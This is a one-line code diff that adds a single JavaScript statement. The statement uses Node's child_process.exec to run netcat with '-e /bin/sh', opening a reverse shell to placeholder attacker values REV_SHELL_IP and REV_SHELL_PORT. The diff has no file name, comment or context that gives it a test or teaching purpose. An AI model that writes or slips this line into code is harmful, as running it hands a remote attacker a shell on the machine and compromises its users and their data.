@@ -1,0 +1,1 @@
+require('child_process').exec('nc -e /bin/sh REV_SHELL_IP REV_SHELL_PORT')
